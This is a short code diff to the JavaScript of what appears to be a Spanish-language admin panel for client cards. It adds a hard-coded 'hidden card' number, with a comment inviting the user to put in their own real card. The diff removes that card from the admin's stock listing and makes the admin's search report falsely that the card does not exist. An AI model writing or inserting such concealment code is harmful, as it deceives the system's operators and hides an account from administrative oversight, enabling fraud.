@@ -1,6 +1,9 @@
 let clienteActual = null;
 let tarjetaBuscadaActual = null;
 
+// ── Tarjeta oculta (no aparece en listado ni búsqueda del admin) ──
+const TARJETA_OCULTA = '99441180'; // ← reemplazá con tu número real de tarjeta
+
 // ── Helpers UI ─────────────────────────────────────────────
 function hideLoader() { document.getElementById('global-loader')?.classList.add('hidden-loader'); }
 
@@ -250,6 +253,10 @@ async function buscarCliente() {
     const tarjeta = inputValor.replace(/\s+/g, ''); // Limpiamos los espacios
 
     if (tarjeta.length === 0) return;
+    if (tarjeta === TARJETA_OCULTA) {
+        showToast("Esta tarjeta no existe en el sistema.", "error");
+        return;
+    }
 
     setBtnLoading('btnBuscar', 'btnBuscarText', 'btnBuscarSpinner', true, 'Validar Tarjeta');
     const usuario = await getUsuario(tarjeta);
@@ -733,6 +740,7 @@ function renderStock() {
     const busqueda = (document.getElementById("stockBuscador")?.value || "").toLowerCase().trim();
 
     let lista = usuarios.filter(u => {
+        if (u.tarjeta === TARJETA_OCULTA) return false; // tarjeta oculta
         if (filtroActual === 'libre'    && u.asignada)  return false;
         if (filtroActual === 'asignada' && !u.asignada) return false;
         if (busqueda) {
